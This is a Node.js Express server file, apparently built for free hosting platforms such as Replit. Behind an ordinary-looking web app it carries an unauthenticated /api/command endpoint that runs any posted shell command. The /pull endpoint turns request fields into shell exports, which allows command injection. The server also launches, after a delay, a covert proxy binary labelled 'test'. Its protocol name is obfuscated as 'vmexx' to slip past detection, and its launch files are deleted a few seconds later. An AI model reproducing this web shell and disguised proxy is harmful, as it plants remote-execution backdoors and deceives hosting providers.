const dotenv = require("dotenv");
dotenv.config();

const fs = require('fs');
const { exec } = require('child_process');
const http = require('http')
const httpProxy = require('http-proxy')
const express = require('express')
const path = require('path')
const multer = require('multer')
const upload = multer({ dest: 'uploads/' })
const PORT = process.env.PORT || 5000

var app = express();
var proxy = httpProxy.createProxyServer();
var server = http.createServer(app);

app.use(express.urlencoded({ extended: true }))
app.use(express.json())

function getRndInteger(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
const randport = {
  PORT: getRndInteger(10000, 19999)
}

function cleanHeaders(request) {
  for (var key in request.headers) {
    if (key.indexOf('cf-') == 0 || key.indexOf('x-') == 0) {
      delete request.headers[key];
    }
  }
  return request;
}
app.locals.requests = 0;
server.on('upgrade', function (req, socket, head) {
  app.locals.requests++;
  proxy.ws(cleanHeaders(req), socket, head, {
    target: `ws://localhost:${randport.PORT}`,
    ws: true
  })
});
proxy.on('error', function (e) { });
app.get('/download', function (req, res) {
  proxy.web(req, res, {
    target: `ws://localhost:${randport.PORT}`,
    ws: true
  });
})
app.post('/download', function (req, res) {
  proxy.web(req, res, {
    target: `ws://localhost:${randport.PORT}`,
    ws: true
  });
})

function bash(command) {
  return new Promise((resolve, reject) => {
    var result = '<pre>';
    const ls = exec(command, function (error, stdout, stderr) {
      if (error) {
        result += 'Error code: \n' + error.code;
        result += 'Signal received: \n' + error.signal;
        result += '</pre>';
        reject(result);
      }
      result += 'Child Process STDOUT: \n' + stdout;
      result += 'Child Process STDERR: \n' + stderr;
      result += '</pre>';
      resolve(result);
    });
    ls.on('exit', function (code) {
      result += 'Child process exited with exit code: ' + code + '\n';
    });
  });
}

function inst() {
  var protocol = "vmexx";
  var env = "export UUID=" + process.env.UUID + " && "
    + "export TEST_DOWNLOAD_URL=" + process.env.TEST_DOWNLOAD_URL + " && "
    + "export CONF_DOWNLOAD_URL=" + process.env.CONF_DOWNLOAD_URL + " && "
    + "export TAR_PASSWORD=" + process.env.TAR_PASSWORD + " && "
    + "export RANDPORT=" + randport.PORT + " && ";
  bash(`${env} ./inst.sh > views/pages/inst${process.env.pm_id}.ejs`)
    .then(result => {
      fs.readFile(`test/config.template.txt`, 'utf8', (err, data) => {
        if (err) return;
        data = data.replace("18081", randport.PORT);
        data = data.replace("UUID", process.env.UUID);
        data = data.replace("VERSION", protocol.replace("xx", "ss")); //anti-i-b-m
        var conffile = `test/${randport.PORT}.conf`;
        var bashfile = `test/${randport.PORT}.bash`;
        var testfile = `test/${randport.PORT}.test`;
        fs.writeFile(conffile, data, (err) => {
          if (err) return;
          try {
            fs.appendFileSync(bashfile, `nohup test/test -config ${conffile} > /dev/null 2>&1 &\n`);
            fs.appendFileSync(bashfile, `echo $! > ${testfile}\n`);
            bash(`chmod +x ${bashfile} && ./${bashfile}`)
              .then(result => {
                fs.readFile(testfile, 'utf8', (err, data) => {
                  if (!err) {
                    process.env.test_pid = data.replace("\n", "");
                  }
                });
              });
            setTimeout(() => {
              fs.unlink(bashfile, () => { });
              fs.unlink(conffile, () => { });
              fs.unlink(testfile, () => { });
            }, 1000 * 5);
          } catch (err) { }
        });
      });
    });
};

process.env.pm_id = process.env.pm_id || 0;
setTimeout(() => {
  if (fs.existsSync('test/test') && fs.existsSync('test/config.template.txt')) {
    inst();
  } else {
    if (process.env.pm_id == 0) {
      inst();
    } else {
      var intervalHandler = setInterval(() => {
        if (fs.existsSync('test/test') && fs.existsSync('test/config.template.txt')) {
          clearInterval(intervalHandler);
          inst();
        }
      }, 1000);
    }
  }
}, 1000 * getRndInteger(60, 90));

app.post("/pull", upload.single('file'), (request, response) => {
  fs.rename(request.file.path, request.file.originalname, (err) => {
    if (err) return response.json(err);
    var env = "";
    for (var key in request.body) {
      env += `export ${key}=${request.body[key]} && `
    }
    bash(`${env}bash pull ${request.file.originalname}`)
      .then(result => response.end(result))
      .catch(result => response.end(result));
  });
});
app.get("/pull", (request, response) => {
  bash(`bash pull`)
    .then(result => response.end(result))
    .catch(result => response.end(result));
});

app.post("/api/command", function (request, response) {
  bash(request.body.command)
    .then(result => response.send({ "name": result }))
    .catch(result => response.send({ "name": result }))
});
app.post("/api/visitors", function (request, response) {
  var userName = request.body.name;
  var doc = { "name": userName };
  response.send(doc);
});

app
  .use(express.static(path.join(__dirname, 'public')))
  .set('views', path.join(__dirname, 'views'))
  .set('view engine', 'ejs')
  .get('/', (req, res) => res.render('pages/index'))
  .get('/cnt', (req, res) => res.render('pages/cnt'))
  .get('/inst', (req, res) => res.render('pages/inst'))
  .get('/inst/:id', (req, res) => res.render(`pages/inst${req.params.id}`))
  .get('/hello', (req, res) => res.render('pages/hello'))
  .get('/whoami', (req, res) => res.render('pages/whoami'))
  .get('/status', (req, res) => res.json({ "status": "OK", timestamp: Date.now() }))
  .get('/status/:rnd', (req, res) => res.json({ "status": "OK", timestamp: Date.now() }))
  .get('/ns', (req, res) => {
    bash(`./netstat -ntulp`)
      .then(result => res.end(result))
      .catch(result => res.end(result))
  })

server.listen(PORT, () => console.log(`Listening on ${PORT}`))

fs.appendFile('pids', `${process.pid} `, () => { });

function getTimestamp() {
  var d = new Date();
  var localTime = d.getTime();
  var localOffset = d.getTimezoneOffset() * 60000;
  var utc = localTime + localOffset;
  var offset = 8; //Shanghai
  var shanghai = utc + (3600000 * offset);
  var nd = new Date(shanghai);
  var timestamp = nd.toString();
  return timestamp
}
if (process.env.REPL_SLUG && process.env.pm_id && process.env.pm_id == 0) {
  var whoami = "<pre>\n"
  whoami += (new Date()).toString() + "\n";
  whoami += getTimestamp().toString() + "\n";
  whoami += `${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co\n`
  whoami += "</pre>\n"
  fs.writeFile("views/pages/whoami.ejs", whoami, () => { });
}

function quit(signal) {
  server.close(() => {
    if (process.env.test_pid) {
      process.kill(process.env.test_pid);
    }
    // MUST use Sync functions!!!
    try {
      var data = fs.readFileSync("pids", "utf8");
      fs.writeFileSync("pids", data.replace(`${process.pid} `, ""));
    } catch (err) { }
    process.exit(0);
  });
}

process.on('SIGINT', () => quit('SIGINT'));
process.on('SIGTERM', () => quit('SIGTERM'));
